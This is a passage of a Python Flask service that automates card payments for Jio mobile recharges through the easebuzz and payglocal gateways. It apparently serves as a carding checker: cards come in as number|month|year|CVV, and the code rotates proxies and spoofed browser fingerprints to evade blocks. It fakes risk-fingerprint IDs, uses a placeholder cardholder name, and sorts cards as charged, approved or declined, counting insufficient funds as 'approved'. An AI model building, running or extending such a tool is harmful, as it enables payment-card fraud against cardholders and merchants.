            d9 = {}
        if not d9.get("token"):
            return _resp("error", f"Card authorization failed: {_short(d9.get('message'))}",
                         number, masked, amount=plan_amount, plan=plan_name)

        # ── 10 card confirmation (Jio tokenises the card) ─────────────
        log("  [10] card confirmation")
        r10 = req("POST", JIO_CCDC, headers=_jio_headers(
            JIO_CARD_PAGE, "application/json", "https://pay.jio.com",
            {"x-token": d9["token"]}),
            json={"cvvNumber": card["cvv"], "cashBackApplied": "N",
                  "isTrxnStatusCheckEnable": "N", "seqId": "", "ccRoutePg": "",
                  "customerCardTypeValue": brand["customerCardTypeValue"],
                  "paymentMode": "CCDC", "offerAppliedByCust": False, "viewOffer": False,
                  "cardType": brand["cardType"], "cardNumber": card["cc"],
                  "cardTypeText": brand["cardTypeText"],
                  "expiryMonth": card["mm"], "expiryYear": card["yy"],
                  "cardHolderName": card_name, "userCardSaveConsent": False,
                  "browserDetails": {
                      "browserHeader": "application/json", "browserJavaEnabled": False,
                      "browserJavascriptEnabled": True, "browserLanguage": "en-US",
                      "browserColorDepth": _screen()["depth"],
                      "browserScreenHeight": _screen()["h"], "browserScreenWidth": _screen()["w"],
                      "browserTz": TZ, "browserUserAgent": _ua()}})
        try:
            d10 = r10.json()
        except Exception:
            d10 = {}
        if not d10.get("status"):
            msg = (d10.get("message") or d10.get("errorMessage")
                   or d10.get("errors", {}).get("detailedMessage") or "Card confirmation failed")
            return _resp("error", msg, number, masked, amount=plan_amount, plan=plan_name)
        html_form = d10.get("htmlForm") or ""
        acs_url = _form_action(html_form)
        acs_fields = _form_fields(html_form)
        if not acs_url:
            return _resp("error", "No 3DS form returned by Jio", number, masked,
                         amount=plan_amount, plan=plan_name)

        # ── 11 gateway ACS → payglocal token ──────────────────────────
        log("  [11] gateway 3DS redirect")
        gate = _gate_from_url(acs_url) or "easebuzz"
        log(f"      gate {gate} · {urlparse(acs_url).hostname or '-'}")
        r11 = req("POST", acs_url, data=acs_fields, allow_redirects=True,
                  headers={"Content-Type": "application/x-www-form-urlencoded",
                           "Origin": "https://pay.jio.com",
                           "Referer": portal_ref or JIO_CARD_PAGE,
                           **_doc_headers(referer=portal_ref or JIO_CARD_PAGE)})
        history = list(getattr(r11, "history", None) or [])
        hop_urls = [h.url for h in history] + [r11.url or ""]
        hop_bodies = [getattr(h, "text", "") or "" for h in history] + [r11.text or ""]
        gate = _gate_from_url(*hop_urls) or gate
        gl_token = _extract_gl_token(*hop_urls, *hop_bodies)
        if not gl_token:
            err = _gateway_error(r11)
            if err:
                return _resp("error", f"{gate}: {err}", number, masked,
                             amount=plan_amount, plan=plan_name, gate=gate,
                             final_url=_short(r11.url, 160))
            if _looks_like_challenge(r11.text):
                return _resp("3ds", f"{gate}: 3DS challenge required (OTP)", number, masked,
                             amount=plan_amount, plan=plan_name, gate=gate,
                             step_up=True, final_url=_short(r11.url, 160))
            return _resp("error",
                         f"{gate}: no payglocal token after 3DS redirect "
                         f"({_short(r11.url, 120)})", number, masked,
                         amount=plan_amount, plan=plan_name, gate=gate)
        gate = "payglocal"
        gl_ref = f"{GL_BASE}/gl/payflow-ui/?x-gl-token={gl_token}"
        log(f"      gl token {gl_token[:24]}…")

        # ── 12 payglocal data collection ──────────────────────────────
        log("  [12] payglocal redirect/dc")
        r12 = req("GET", GL_DC, params={"x-gl-token": gl_token}, headers=_gl_headers(
            gl_ref, extra={"x-gl-current-host": "api.payglocal.com", "x-gl-gid": "gl_payflow-ui",
                           "x-gl-pb-tag-id": "", "x-gl-previous-host": "https://pay.easebuzz.in/",
                           "x-gl-referrer-mismatch": "false",
                           "x-gl-trusted-referrer": "https://pay.easebuzz.in"}))
        try:
            d12 = r12.json()
        except Exception:
            d12 = {}
        dcr = ((d12.get("data") or {}).get("payflowTxnResponse") or d12.get("data") or {})
        meta = dcr.get("metaInfo") or {}
        header_info = dcr.get("headerInfo") or {}
        log(f"      card {meta.get('cardBrand')} · {meta.get('maskedCardNumber')} "
            f"· {meta.get('issuerName')} · txn {header_info.get('merchantTxnId')}")

        # ── 13 billing zip lookup ─────────────────────────────────────
        log("  [13] zip lookup")
        billing = {}
        if zip_code:
            r13 = req("GET", GL_ZIPCODE.format(country=country, zip=zip_code),
                      params={"x-gl-token": gl_token}, headers=_gl_headers(gl_ref))
            try:
                d13 = r13.json()
            except Exception:
                d13 = {}
            zdata = d13.get("data") or {}
            if str(d13.get("status", "")).upper() == "SUCCESS" and zdata:
                billing = {
                    "addressCountry": country,
                    "addressPostalCode": str(zip_code).upper(),
                    "addressCity": zdata.get("city") or "",
                    "addressState": zdata.get("state") or "",
                    "addressStateCode": zdata.get("stateCode") or "",
                }
                billing = {k: v for k, v in billing.items() if v}
                log(f"      {zip_code} → {zdata.get('city')}, {zdata.get('stateCode')}")
            else:
                billing = {"addressCountry": country, "addressPostalCode": str(zip_code).upper()}
                log(f"      zip lookup failed: {_api_error(r13)}")

        # ── 14 risk fingerprint (gives the encryption kid) ────────────
        log("  [14] risk fingerprint")
        visitor_id = (dcr.get("visitorId") or header_info.get("visitorId")
                      or _extract_visitor_id(r12.text, json.dumps(d12), html_form))
        visitor_found = bool(visitor_id)
        visitor_id = visitor_id or ("gdc" + "".join(
            random.choice(string.ascii_letters + string.digits) for _ in range(15)))
        r14 = req("POST", GL_RISK_FP, params={"x-gl-token": gl_token}, headers=_gl_headers(
            gl_ref, "application/json", {"Origin": "https://api.payglocal.com"}),
            json={"requestId": f"{int(time.time() * 1000)}.{random.randint(100000, 999999)}",
                  "visitorId": visitor_id, "visitorFound": visitor_found,
                  "confidenceScore": 1})
        try:
            kid = ((r14.json().get("data") or {}).get("kid") or "")
        except Exception:
            kid = ""
        log(f"      kid {kid or '-'}")

        # ── 15 pay now ────────────────────────────────────────────────
        log("  [15] paynow")
        paynow_payload = {
            "customerCurrency": "INR",
            "saveCurrencyPreference": False,
            "browserDetails": _browser_details(),
            "billingData": billing,
            "shippingData": {},
            "agreedOnTnCs": True,
        }
        r15 = req("POST", GL_PAYNOW, params={"x-gl-token": gl_token}, headers=_gl_headers(
            gl_ref, "application/json", {"Origin": "https://api.payglocal.com"}),
            json={"isEnc": "false", "kid": kid, "payload": paynow_payload})
        try:
            d15 = r15.json()
        except Exception:
            d15 = {}
        d15_data = d15.get("data") or {}
        next_action = d15_data.get("nextAction") or ""
        forms = d15_data.get("forms") or d15_data.get("payflowForms") or {}
        log(f"      status={d15.get('status')} nextAction={next_action or '-'} "
            f"forms={list(forms.keys()) or '-'}")

        if str(d15.get("status", "")).upper() in ("SUCCESS", "CHARGED", "CAPTURED"):
            return _resp("charged", d15.get("message") or "Payment successful", number, masked,
                         amount=plan_amount, plan=plan_name,
                         txn_id=header_info.get("merchantTxnId"))

        # ── 15b 3-D Secure data collection ────────────────────────────
        cardinal_request = {"messageType": "", "payload": ""}
        cardinal_form = forms.get("Cardinal_DataCollection")
        if cardinal_form:
            log("  [15b] cardinal 3DS collection")
            cardinal_request = _cardinal_collect(sess, cardinal_form, log)

        # ── 16 charge ─────────────────────────────────────────────────
        log("  [16] ipay")
        ipay_payload = {
            "customerCurrency": "INR",
            "cardinalRequest": cardinal_request,
            "saveCurrencyPreference": False,
            "browserDetails": _browser_details(),
            "reachData": {"fingerprintId": ""},
            "kountData": {"sessionId": "", "merchantId": ""},
            "billingData": billing,
            "shippingData": {},
        }
        r16 = req("POST", GL_IPAY, params={"x-gl-token": gl_token}, headers=_gl_headers(
            gl_ref, "application/json", {"Origin": "https://api.payglocal.com"}),
            json={"isEnc": "false", "kid": kid, "payload": ipay_payload})
        try:
            result = r16.json()
        except Exception:
            result = {}

        pay_status = str(result.get("status") or "").upper()
        reason_code = result.get("reasonCode") or ""
        message = result.get("message") or result.get("error") or ""
        errors = result.get("errors") or {}
        if isinstance(errors, dict):
            detail = errors.get("detailedMessage") or errors.get("displayMessage") or ""
            if detail and detail not in message:
                message = f"{message} ({detail})" if message else detail
        log(f"      result {pay_status} {reason_code} {message}")

        # ── 17 decline detail / step-up info ──────────────────────────
        retry = {}
        if pay_status not in ("SUCCESS", "CHARGED", "CAPTURED", "AUTHORIZED", "APPROVED"):
            log("  [17] retry data")
            try:
                r17 = req("GET", GL_RETRY, params={"x-gl-token": gl_token},
                          headers=_gl_headers(gl_ref))
                retry = ((r17.json().get("data") or {}).get("retryData") or {})
            except Exception:
                retry = {}

        failure_type = retry.get("failureType") or ""
        failure_message = retry.get("failureMessage") or ""
        recommendation = retry.get("recommendationMessage") or ""
        issuer = retry.get("issuerName") or meta.get("issuerName") or ""

        extra = {
            "reason_code": reason_code,
            "issuer": issuer,
            "brand": meta.get("cardBrand") or _card_brand(bin6),
            "failure_type": failure_type,
            "txn_id": header_info.get("merchantTxnId"),
            "masked_card": meta.get("maskedCardNumber") or masked,
        }

        if pay_status in ("SUCCESS", "CHARGED", "CAPTURED", "AUTHORIZED", "APPROVED"):
            return _resp("charged", message or "Payment successful", number, masked,
                         amount=plan_amount, plan=plan_name, **extra)

        # the issuer wants the customer to approve the payment (GL-201-017)
        if failure_type == "SECURITY_RISK_DECLINE" or "confirm with your bank" in failure_message.lower():
            extra["step_up"] = True
            extra["recommendation"] = recommendation
            extra["try_new_card"] = retry.get("tryNewCard")
            return _resp("approved",
                         failure_message or "Almost there! Confirm with your bank",
                         number, masked, amount=plan_amount, plan=plan_name, **extra)

        if pay_status == "INPROGRESS":
            return _resp("approved", message or "Transaction in progress (3DS pending)",
                         number, masked, amount=plan_amount, plan=plan_name, **extra)

        if "insufficient" in (message or "").lower():
            return _resp("approved", message, number, masked,
                         amount=plan_amount, plan=plan_name, **extra)

        return _resp("declined", message or reason_code or "Declined", number, masked,
                     amount=plan_amount, plan=plan_name, **extra)

    except _RetryFlow:
        raise
    except Exception as exc:  # noqa: BLE001
        import traceback
        traceback.print_exc()
        return _resp("error", str(exc)[:200], number, masked, amount=amount)


def _proxy_exit_ip(proxy: str, timeout: float = 8.0) -> str:
    if not proxy:
        return ""
    try:
        from curl_cffi import requests as cffi
        s = cffi.Session(impersonate="chrome131",
                         proxies={"http": proxy, "https": proxy})
        r = s.get("https://api.ipify.org?format=json", timeout=timeout, verify=False)
        return str((r.json() or {}).get("ip") or "")
    except Exception:
        return ""


def _recharge(number: str, card: dict, amount: float, zip_code: str = "10080",
              country: str = "US", card_name: str = "JOHN DOE",
              proxy=None, proxies=None, retries: int = 3,
              gate: Optional[str] = None, check_proxy: bool = False,
              force: bool = False) -> dict:
    """Run the flow with browser/TLS + proxy rotation; restarts on blocks."""
    masked = _mask(card["cc"])
    # Let gateway decide; some amounts may be rejected by acquirer
    pool = _proxy_candidates(proxy, proxies)
    tries = max(1, min(int(retries or 1), 8))
    last = None
    for i in range(tries):
        p = pool[i % len(pool)] if pool else None
        prof = random.choice(BROWSERS)
        print(f"  attempt {i + 1}/{tries} · {_redact_proxy(p)} · {prof['impersonate']}",
              flush=True)
        try:
            res = _recharge_once(number, card, amount, zip_code, country,
                                 card_name, p, prof)
        except _RetryFlow as exc:
            print(f"    retry: {exc}", flush=True)
            last = _resp("error", str(exc), number, masked, amount=amount,
                         proxy=_redact_proxy(p))
            if i + 1 < tries:
                time.sleep(min(4.0, 1.0 + i))
            continue
        res.setdefault("proxy", _redact_proxy(p))
        if gate:
            res.setdefault("gate", gate)
        if check_proxy and p:
            res["proxy_ip"] = _proxy_exit_ip(p)
        return res
    if last is None:
        last = _resp("error", "All attempts failed", number, masked, amount=amount)
    last["attempts"] = tries
    return last


# ─────────────────────────────── routes ───────────────────────────────
@app.route("/", methods=["GET"])
def health():
    return jsonify({
        "status": "ok",
        "service": "jio-new",
        "flow": "jio.com → pay.jio.com → gateway ACS → payglocal",
        "gates": ["easebuzz", "payglocal"],
        "min_amount": GATEWAY_MIN_AMOUNT,
        "proxies": len(PROXIES),
        "browsers": [b["impersonate"] for b in BROWSERS],
        "endpoint": "/rc?jio=<number>&amount=<amt>&cc=<cc|mm|yy|cvv>&zip=<zip>"
                    "&proxy=<url>&proxies=<list>&retries=<n>&check=1&gate=<name>",
    })


@app.route("/rc", methods=["GET"])
def rc():
    number = (request.args.get("jio") or request.args.get("number") or "").strip()
    amount_raw = (request.args.get("amount") or "").strip()
    cc_raw = (request.args.get("cc") or "").strip()
    zip_code = (request.args.get("zip") or "10080").strip()
    country = (request.args.get("country") or "US").strip().upper()
    card_name = (request.args.get("name") or "JOHN DOE").strip()
    proxy = (request.args.get("proxy") or "").strip() or None
    proxies = (request.args.get("proxies") or "").strip() or None
    gate = (request.args.get("gate") or "").strip().lower() or None
    check_proxy = (request.args.get("check") or "").lower() in ("1", "true", "yes")
    force = (request.args.get("force") or "").lower() in ("1", "true", "yes")
    try:
        retries = int(request.args.get("retries") or 3)
    except ValueError:
        retries = 3

    if not number or not re.fullmatch(r"\d{10}", number):
        return jsonify(_resp("error", "Invalid 'jio' number", number, "")), 400
    if not amount_raw:
        return jsonify(_resp("error", "Missing 'amount'", number, "")), 400
    try:
        amount = float(amount_raw)
    except ValueError:
        return jsonify(_resp("error", "Invalid 'amount'", number, "")), 400
    if amount <= 0:
        return jsonify(_resp("error", "Amount must be > 0", number, "")), 400

    card = _parse_card(cc_raw)
    if not card:
        return jsonify(_resp("error", "Invalid 'cc' format", number, "")), 400

    print(f"\n=== /rc {number} | ₹{amount:g} | {_mask(card['cc'])} "
          f"| {_card_brand(card['cc'][:6])} | zip {zip_code} ===", flush=True)
    res = _recharge(number, card, amount, zip_code, country, card_name,
                    proxy=proxy, proxies=proxies, retries=retries,
                    gate=gate, check_proxy=check_proxy, force=force)
    if res.get("amount") in ("N/A", None):
        res["amount"] = amount
    elif isinstance(res.get("amount"), float) and res["amount"].is_integer():
        res["amount"] = int(res["amount"])
    try:
        if res.get("amount") not in ("N/A", None) and isinstance(res.get("amount"), (int, float)):
            a = float(res["amount"])
            res["price"] = f"₹{int(a) if a.is_integer() else a}"
    except Exception:
        pass
    res["cc"] = _mask(card["cc"]) or res.get("card", "")
    res["number"] = number
    return jsonify(res)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5001))
    app.run(host="0.0.0.0", port=port, threaded=True)
